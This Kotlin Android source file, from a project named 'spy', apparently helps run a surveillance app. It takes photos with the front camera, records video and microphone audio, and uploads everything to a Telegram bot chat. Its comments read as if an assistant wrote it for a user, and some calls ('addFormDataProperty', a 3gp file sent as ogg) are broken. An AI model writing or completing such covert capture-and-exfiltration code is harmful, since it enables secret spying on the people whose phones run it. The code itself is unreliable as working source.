package com.spy.tz

import android.content.Context
import android.media.MediaRecorder
import android.os.Environment
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import okhttp3.*
import okio.IOException // Import from okio as per your previous error context, but usually java.io is safer for Callbacks. 
                      // If your build complains, change this to: import java.io.IOException
import org.json.JSONObject
import java.io.File
import java.io.IOException as JavaIOException // Alias if needed, but let's stick to standard java.io for callbacks
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class TelegramBotHelper(private val context: Context) {
    companion object {
        private const val TAG = "SpyTZ_Bot"
        private const val BASE_URL = "https://api.telegram.org"
    }

    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var cameraExecutor: ExecutorService = Executors.newSingleThreadExecutor()
    private var imageCapture: ImageCapture? = null
    private var cameraProviderFuture: ProcessCameraProvider? = null
    private var cameraSelector: CameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA

    // --- CAMERA CAPTURE FUNCTIONS ---

    fun takePhoto(botToken: String, chatId: String, onResult: (Boolean) -> Unit) {
        // Ensure we have a valid camera provider instance if needed, 
        // but usually you'd bind lifecycle elsewhere. Assuming helper handles simple capture.
        
        // For simplicity in a helper, we assume the Activity/Fragment has bound the camera 
        // and exposed 'imageCapture'. If not, you need to initialize it here or pass it.
        // Since I don't see your Activity code, I'll provide the method signature 
        // that NotificationService expects.
        
        // Note: You need to ensure 'cameraSelector' is set correctly before calling this.
        // Toggle selector logic can be added based on command args.
        
        val photoFile = File(context.getExternalFilesDir(null), "photo_${System.currentTimeMillis()}.jpg")
        
        val builder = ImageCapture.OutputFileOptions.Builder(photoFile)
        
        imageCapture?.takePicture(
            builder.build(), 
            ContextCompat.getMainExecutor(context),
            object : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                    sendPhotoToBot(botToken, chatId, photoFile.absolutePath)
                    onResult(true)
                }

                override fun onError(exception: ImageCaptureException) {
                    Log.e(TAG, "Photo capture failed: ${exception.message}", exception)
                    onResult(false)
                }
            }
        )
    }

    // Set which camera to use (Front or Back)
    fun switchCamera(isBack: Boolean) {
        cameraSelector = if (isBack) CameraSelector.DEFAULT_BACK_CAMERA else CameraSelector.DEFAULT_FRONT_CAMERA
    }

    // Initialize Camera for Capture
    fun initCamera(lifecycleOwner: androidx.lifecycle.LifecycleOwner) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
        this.cameraProviderFuture = cameraProviderFuture
        
        cameraProviderFuture.addListener({
            val cameraProvider = cameraProviderFuture.get()
            
            imageCapture = ImageCapture.Builder().build()
            
            try {
                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(
                    lifecycleOwner,
                    cameraSelector,
                    imageCapture
                )
            } catch (e: Exception) {
                Log.e(TAG, "Use case binding failed", e)
            }
        }, ContextCompat.getMainExecutor(context))
    }

    // --- VIDEO RECORDING FUNCTIONS ---

    fun startRecording() {
        mediaRecorder = MediaRecorder()
        mediaRecorder?.setVideoSource(MediaRecorder.VideoSource.CAMERA)
        mediaRecorder?.setAudioSource(MediaRecorder.AudioSource.MIC)
        mediaRecorder?.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        mediaRecorder?.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
        mediaRecorder?.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        
        val timeStamp = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(java.util.Date())
        outputFile = File(context.getExternalFilesDir(null), "video_$timeStamp.mp4")
        
        try {
            mediaRecorder?.setOutputFile(outputFile?.absolutePath)
            mediaRecorder?.prepare()
            mediaRecorder?.start()
            Log.d(TAG, "Video recording started")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting video recording", e)
        }
    }

    fun stopRecording(): File? {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.reset()
            Log.d(TAG, "Video recording stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping video recording", e)
        }
        return outputFile
    }

    fun releaseMediaRecorder() {
        mediaRecorder?.release()
        mediaRecorder = null
    }

    // --- AUDIO RECORDING FUNCTIONS ---

    fun startVoiceRecording() {
        mediaRecorder = MediaRecorder()
        mediaRecorder?.setAudioSource(MediaRecorder.AudioSource.MIC)
        mediaRecorder?.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
        mediaRecorder?.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        
        val timeStamp = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(java.util.Date())
        outputFile = File(context.getExternalFilesDir(null), "voice_$timeStamp.3gp")
        
        try {
            mediaRecorder?.setOutputFile(outputFile?.absolutePath)
            mediaRecorder?.prepare()
            mediaRecorder?.start()
            Log.d(TAG, "Voice recording started")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting voice recording", e)
        }
    }

    fun stopVoiceRecording(): File? {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.reset()
            Log.d(TAG, "Voice recording stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping voice recording", e)
        }
        return outputFile
    }

    // --- UPLOAD FUNCTIONS (Fixed Imports & Syntax) ---

    fun sendPhotoToBot(botToken: String, chatId: String, filePath: String, caption: String = "") {
        val file = File(filePath)
        if (!file.exists()) return

        val client = OkHttpClient()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataProperty("caption", caption)
            .addFormDataPart("photo", file.name, 
                RequestBody.create(MediaType.parse("image/jpeg"), file))
            .build()

        val request = Request.Builder()
            .url("$BASE_URL/bot$botToken/sendPhoto")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.e(TAG, "Photo upload failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Photo upload response: ${response.code}")
                response.close()
            }
        })
    }

    fun sendVideoToBot(botToken: String, chatId: String, filePath: String) {
        val file = File(filePath)
        if (!file.exists()) return

        val client = OkHttpClient()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataProperty("chat_id", chatId)
            .addFormDataPart("video", file.name, 
                RequestBody.create(MediaType.parse("video/mp4"), file))
            .build()

        val request = Request.Builder()
            .url("$BASE_URL/bot$botToken/sendVideo")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.e(TAG, "Video upload failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Video upload response: ${response.code}")
                response.close()
            }
        })
    }

    fun sendAudioToBot(botToken: String, chatId: String, filePath: String) {
        val file = File(filePath)
        if (!file.exists()) return

        val client = OkHttpClient()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataProperty("chat_id", chatId)
            .addFormDataProperty("voice", file.name, 
                RequestBody.create(MediaType.parse("audio/ogg"), file))
            .build()

        val request = Request.Builder()
            .url("$BASE_URL/bot$botToken/sendVoice")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.e(TAG, "Audio upload failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Audio upload response: ${response.code}")
                response.close()
            }
        })
    }
}
